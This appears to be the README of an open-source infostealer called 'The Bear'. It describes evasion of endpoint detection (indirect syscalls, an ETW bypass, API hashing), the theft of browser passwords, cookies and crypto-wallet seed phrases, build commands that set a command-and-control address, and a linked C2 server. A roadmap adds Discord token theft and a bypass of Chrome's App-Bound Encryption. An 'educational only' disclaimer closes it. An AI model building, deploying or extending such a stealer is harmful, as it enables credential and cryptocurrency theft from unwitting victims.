<div align="center">
  <h1>The Bear</h1>
</div>

## Table of Contents
1. [Introduction](#introduction)
2. [Features](#features)
3. [Build](#build)
4. [C2 Server](#c2_server)
5. [TODO](#todo)
6. [Contributing](#contributing)
7. [Acknowledgements](#acknowledgements)
9. [Disclaimer](#disclaimer)

## Introduction
The Bear is an infostealer (redline stealer) malware written in C and assembly with the focus on evading detection.<br>
Unlike traditional infostealers, The Bear functions more as a data exfiltration tool, solely focusing on exfiltrating files to a command-and-control (C2) server. All subsequent operations, including the decryption of passwords and cookies, are performed on the C2 server. This approach eliminates the need for third-party libraries, streamlining the malware's operation and reducing its footprint on the infected system.
> [!NOTE]
> The Bear is in an early state of release. Breaking changes may be made to its core structures, and more enhancements will be added along the way. We appreciate your understanding and patience as the project evolves.

## Features

### Evading Detection
- **Indirect Syscalls:** Utilizes indirect system calls to avoid user-mode hooks.
- **ETWTI Bypass:** Employs proxy function calls to bypass Event Tracing for Windows (ETW) and Threat Intelligence.
- **Dynamic API Resolution:** Resolves API functions dynamically at runtime, making static analysis more challenging.
- **API hashing:** Uses a custom hashing algorithm to hash API function names, making it difficult for static analysis tools to detect and analyze the malware.
- **Strings Encoding:** Encodes strings to evade signature-based detection.

### Malware Capabilities
- **Password and Cookie Theft:** Extracts passwords and cookies from Chromium-based browsers.
- **Cryptocurrency Wallet Theft:** Targets and steals data (seed-phrase) from extension-based cryptocurrency wallets.

## Build

Before building The Bear executable, ensure the following prerequisites are installed:
- **Python.**
- **GNU compiler collection.**

### Linux
1. Open a terminal in the project directory.
2. Run the following command, replacing `<ip>` and `<port>` with the C2 server's IP and port:
    ```bash
    make port=<ip> ip=<port>
    ```
    This will compile the project and create an executable in the "bin" folder.

### Windows
1. Download and install the GNU Compiler Collection (GCC) for Windows from [winlibs](https://winlibs.com/#download-release). Ensure to add the installation directory to your system path environment variable during installation.
2. Open a command prompt in the project directory.
3. Run the following command, replacing `<port>` and `<ip address>` with the C2 server's IP and port where its accessable:
    ```cmd
    build.bat <port> <ip address>
    ```

## C2_server

For the command-and-control (C2) server, you can use the [Hidden Cave](https://github.com/yo-aiv1/hiddencave) C2 server, which is specifically designed for this malware. More information about its setup and functionalities can be found in its repository.

## TODO

- **1:** Improve any part of the stealer.
- **2:** Add the support to bypass App-Bound Encryption to extract cookies [blog](https://thehackernews.com/2024/08/google-chrome-adds-app-bound-encryption.html).
- **3:** Add the support for stealing discord tokens.
- **4:** Add the support for stealing Software-based cryptocurrency wallets seed-phrase.

## Contributing
Contributions are welcome! If you would like to contribute to this project, please open an issue first to discuss your proposed changes or additions. This helps ensure that your contribution aligns with the project's goals and prevents duplication of effort. Additionally, check the TODO section for current bugs to fix and areas for improvement.

Thank you for your interest in improving this project!

## Acknowledgements
Credits to Paranoid Ninja for the ETWTI Bypass [blog](https://0xdarkvortex.dev/hiding-in-plainsight/)

## Disclaimer
This repository is created for educational purposes only. The author is not responsible for any damage or misuse of the code. Users are solely responsible for their actions and any consequences that may arise from using this software. Please use this tool responsibly and ethically, and only in environments where you have explicit permission to conduct security testing.
